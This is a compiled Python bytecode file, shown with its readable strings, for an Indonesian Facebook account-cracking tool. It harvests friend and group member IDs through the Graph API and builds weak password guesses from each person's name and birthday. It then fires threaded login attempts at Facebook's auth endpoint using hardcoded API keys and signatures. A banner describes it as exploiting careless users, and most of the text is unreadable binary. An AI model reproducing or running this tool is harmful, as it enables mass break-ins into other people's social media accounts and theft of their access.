B
    g4]�"  �               @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZ	d dl
mZ d dlmZ d dlmZ e �� Ze�d� eje j�� dd� dd	� Zejd
kr�dZndZdd� Zg Zg ZdZd adZ dd� Z!dd� Z"dd� Z#dd� Z$dd� Z%dd� Z&dd� Z'dd � Z(d!d"� Z)d#d$� Z*e!�  e"�  d%e� fge_+zJy8x2e$� \ZZ,e'�  e-ee�d& � e!�  e"�  �q:W W n   Y nX W de.ee�� d'ee�� d(ee�� d)�� e/d*d+��0d,� X dS )-�    N)�choice)�
ThreadPool)�promptF�   )Zmax_timec              C   s&   t j} tj| | ft j��  t�� }d S )N)�sys�
executable�os�execl�argv�getcwd)Zpython�curdir� r   �main.py�res
   s    r   �nt� )z[0;1mz[1;31mz[1;32mz[1;33mz[1;34mz[1;35mz[1;36mc              C   s�   yFt dd��� } t| �dk s$| dkr@t�d� ttt�d � n| S W nj tk
r�   t	tt�d � tj
dkr|t�d� n
t�d	� ttt�d
 �}t dd��|� t�  Y nX d S )Nz	agent.txt�r�   r   zOops user agent kosongz&User agent gak ada!
Kopas dari browserr   z3start https://pgl.yoyo.org/http/browser-headers.phpz6xdg-open https://pgl.yoyo.org/http/browser-headers.phpzisi user-agent: �w)�open�read�lenr   �remove�exit�ch�wrn�FileNotFoundError�print�name�system�input�writer   )Zhed�swr   r   r   �heder   s    


r#   )Z
first_name�	last_nameZusernameZmiddle_name�birthdayz\|/-c               C   s,   t d� tjdkrt�d� n
t�d� d S )Nzd



































































































r   �cls�clear)r   r   r   r   r   r   r   r   r&   ,   s    
r&   c              C   s�   x`dD ]X} xDt d�D ]8}ttt�ttjtj d � d ddd� t�d� qW t| ddd� qW t	�  t
�d	tt�� d
�� d S )NzLoading... �   �.�r   T)�end�flushg{�G�z�?zecho -e -n 'z!';cowsay -f vader Selamat datang!)�ranger   r   r   �stgZascii_lettersZdigits�timeZsleepr&   r   r   )�i�nr   r   r   �wel3   s    
*r2   c             C   sR   d|kr&t td d |  d | � n(d|d krNt td d |  d | � d S )	N�access_token�   u   [✓] z : zwww.facebook.comZ	error_msg�   z[X] )r   r   )r0   �xZkyunr   r   r   �check<   s    r7   c              C   s�   t �� } d| krptdd��� }t�d| �}t�|j�}d|krbt	t
t�� d�� tt �d�� q�|d |fS ntd�}|d	kr�t�  nt�  d S )
Nz	login.txtr   z+https://graph.facebook.com/me?access_token=�errorz�Error: Sesi ini telah dibatalkan karena pengguna mengubah kata sandi mereka atau Facebook telah mengubah sesi untuk alasan keamanan
Silahkan login kembali dengan akun yang sama atau akun yang berbedazrm login.txtr   zgak ada token
login?(y|n)�y)r   �listdirr   r   �requests�get�json�loads�textr   r   r   r   r   r    �login)�aswZtod�logZbzr   r   r   �tokenA   s    rC   c        	      C   s4  t d�} t ddd�}t�  t�d� dtj_tjdd� | tjd< |tjd	< t��  t�	� }d
|k�rt
d� d|  d | d }dd| ddddd|ddd�}t�d�}|�|�� � |�� }|�d|i� d}tj||d�}t�|j�}tdd��|d � t
d� t�  n"d |k�r"t
d!� nt
d"� t�  d S )#Nz
username: z
password: T)Zis_passwordzhttps://m.facebook.comr   )Znr�email�passzsave-devicezMembuat tokenzGapi_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=z`format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=z;return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32Z 882a8490361da98702bf97a021ddc14d�passwordZJSON�1Zen_USz
auth.login�0z1.0)Zapi_keyZcredentials_typerD   �formatZgenerate_machine_idZgenerate_session_cookiesZlocale�methodrF   Zreturn_ssl_resources�vZmd5�sigz'https://api.facebook.com/restserver.php)Zparamsz	login.txtr   r3   zLOGIN BERHASIL!Z
checkpointzcheckpoint ganzusername/password salah)�prr&   �brr   Z_factoryZis_htmlZselect_formZformZsubmitZgeturlr   �hashlib�new�update�encodeZ	hexdigestr;   r<   r=   r>   r?   r!   r   r   )	�usrZpwZurlrL   �datar6   �ar   �zr   r   r   r@   S   s8    






r@   c              C   s`   yNt ttt�d tt� ��} | dkr2t�d� n| dkrFt�d� nt�  W n   Y nX d S )Nz1.WA
2.Fb
> r   z%xdg-open https://wa.me/62895640466851r4   z(xdg-open https://fb.me/mayat.mayat.58555)�intr    r   r   r   r   �nanya)Zsur   r   r   �contactr   s    
rY   c              C   s�   t tt�� dt� �� y ttt�� dtt�� d��} W n   t�  Y nX | dkrZt�  nV| dkrjt�  nF| dkr�tt�	d�� n.| dkr�tt�	d	�� n| d
kr�t
�  nt�  d S )NzNama: zK1. Akun teman
2. dari grup
3. logout
4. apus header
5. contact me
0. exit
>� rG   �2�3z	login.txt�4z	agent.txt�5)r   r   r   r   r    r   �tmn�grpr   r   rY   )rA   r   r   r   rX   }   s      rX   c              C   s�   t tt�d tt� �} | dkr&d}n*| dkrJt tt�� dtt�� ��}nt�  t�d| d t �}t�|j	�}x:|d D ].}t
�|d	 � ttt�d
 |d	  dd� q|W td� ttt�d tt
�� td�}|�tt
� d S )Nzmine/other: �mine�me�otherzid fb: zhttps://graph.facebook.com/z&/friends?limit=999999999&access_token=rT   �idzMengambil id: �)r+   zMengambil id: Done!           zTotal:r(   )r    r   r   r   r;   r<   �tokr=   r>   r?   �idf�appendr   r   r   �map�crack)�kya�hzr   rV   �s�hhr   r   r   r_   �   s     r_   c              C   s�  d} d}t tt�� d��}|dkr0d}|d }nN|dkrTt tt�� d��}|d }n*|d	krxt tt�� d
��}|d }nt�  ||d kr�t tt�� d��}nd}t�d| | t �}t�|j	�}|dk�r�t
tt�� d�� x8|d D ],}t
td t| � d |d  � | d7 } q�W ytt tt�d ��d }	W n   t�  Y nX t�d|d |	 d	  |d  t �}t�|j	�}x<|d D ]0}t�|d	 � t
tt�d |d	  dd� �q�W n�|dk�rTx�|d D ]~}t
d|d  � t�d|d	  |d  t �}t�|j	�}
x<|
d D ]0}t�|d	 � t
tt�d |d	  dd� �qW �q�W nH|dk�r�x<|d D ]0}t�|d	 � t
tt�d |d	  dd� �qhW t
d� t
tt�d tt�� td�}|�tt� d S )Nr   )z/groups/?access_token=z0/members?fields=id&limit=999999999&access_token=zmine/other/id: ra   rb   r   rc   zid fb: rd   z	id grup: z	all/one: Zgrupzhttps://graph.facebook.com/Zonez$klo pilihan gk ada, pencet enter ganrT   z. r   zPilih: zMengambil id: re   )r+   �allzNama: zMengambil id: Done!           zTotal:r(   )r    r   r   r   r;   r<   rf   r=   r>   r?   r   �strrW   �idgrh   r   r   ri   rj   )rU   ZhumuZwhyZkzlZlsZalr   rV   r0   Zye�kr1   rn   r   r   r   r`   �   s`    



 &$
*
"r`   c       	      C   s�  ddddddg}t �d|  d t �}t�|j�}x�|D ]�}|tkr8|d	kr�|| �d
d�}|�|� |�|dd� |d d�  |dd �  � |�|dd � |d d�  |dd�  � |�|dd � |dd�  |d d�  � q8|�|| � |�|| d � |�|| d � q8W x�|D ]�}yxt	t
d d tt  d d dd� ttt�d k �rftd ndatj�d|  d | d �}t�|�}t| ||� W n   Y nX �q"W d S )NZsayangZ
ganteng123Zganteng12345Z	cantik123Zganteng1234Zcantik12345zhttps://graph.facebook.com/z/?access_token=r%   �/r   r4   �   Z123Z12345r   �[�]z	 Crackingre   )r+   r   z�https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=z&locale=en_US&password=zH&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6)r;   r<   rf   r=   r>   r?   �need�replacerh   r   r   �lodrU   r   �urllibZrequestZurlopen�loadr7   )	rS   ZmoeZuhZnyar0   Zvur6   Zdbrk   r   r   r   rj   �   s.    

**,
$
rj   z
User-AgentzEnter untuk lanjutz#Memanfaatkan pengguna yang ceroboh
zCTRL-Z: keluar dgn paksa
zVGithub: https://git.io/fjiQH
silahkan check pembaruan dengan mengetik python update.pyz
.versi.txtr   zversi: 2.24)1Z	mechanizer;   r=   rO   r   r   r/   rz   �stringr.   Zrandomr   r   Zmultiprocessing.poolr   Zprompt_toolkitr   rM   ZBrowserrN   Zset_handle_robotsZset_handle_refreshZ_httpZHTTPRefreshProcessorr   r   r   r#   rg   rq   rw   rU   ry   r&   r2   r7   rC   r@   rY   rX   r_   r`   rj   Z
addheadersrf   r    r   r   r!   r   r   r   r   �<module>   sP   H

	5

&